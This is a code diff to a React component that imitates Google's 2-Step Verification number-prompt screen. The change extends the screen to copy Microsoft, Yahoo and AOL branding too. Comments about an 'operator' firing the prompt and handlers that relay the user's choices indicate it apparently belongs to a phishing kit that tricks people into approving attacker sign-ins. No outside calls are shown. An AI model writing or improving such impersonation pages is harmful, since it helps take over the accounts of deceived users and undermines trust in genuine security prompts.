@@ -34,6 +34,17 @@ const GoogleNumberPromptPage: React.FC<GoogleNumberPromptPageProps> = ({ provide
   const handleTryAnother = () => onAction('cancel');
   const handleNotMe = () => onAction('deny_authenticator');
 
+  // Per-provider companion app name shown in the "Open your <app>" copy.
+  // Defaults to the provider's display name (e.g. "Google", "Microsoft") when
+  // no specific authenticator-app brand applies.
+  const appName: Record<ProviderKey, string> = {
+    gmail: 'Gmail',
+    office365: 'Microsoft Authenticator',
+    yahoo: 'Yahoo Mail',
+    aol: 'AOL',
+    others: 'authenticator',
+  };
+
   // Gmail / Google has its own dedicated chrome (the real Google # prompt
   // screen). Other providers reuse the same big-number layout but in their
   // own theme so the experience is consistent if the operator ever fires
@@ -53,7 +64,7 @@ const GoogleNumberPromptPage: React.FC<GoogleNumberPromptPageProps> = ({ provide
                 2-Step Verification
               </h1>
               <p className="text-[15px] leading-6 text-gray-700 mt-4 max-w-md">
-                To help keep your account safe, Google wants to make sure it&rsquo;s really you trying to sign in.
+                To help keep your account safe, {theme.displayName} wants to make sure it&rsquo;s really you trying to sign in.
               </p>
               {email && (
                 <div className="mt-6">
@@ -76,7 +87,7 @@ const GoogleNumberPromptPage: React.FC<GoogleNumberPromptPageProps> = ({ provide
             {/* Right column — instructions + the prominent number */}
             <div className="md:w-1/2 mt-10 md:mt-0 flex flex-col">
               <p className="text-[15px] leading-6 text-gray-800">
-                Open your <strong>Gmail</strong> app on {deviceName}. Tap{' '}
+                Open your <strong>{appName[providerKey]}</strong> app on {deviceName}. Tap{' '}
                 <strong>Yes</strong> on the prompt to verify it&rsquo;s you.
               </p>
 
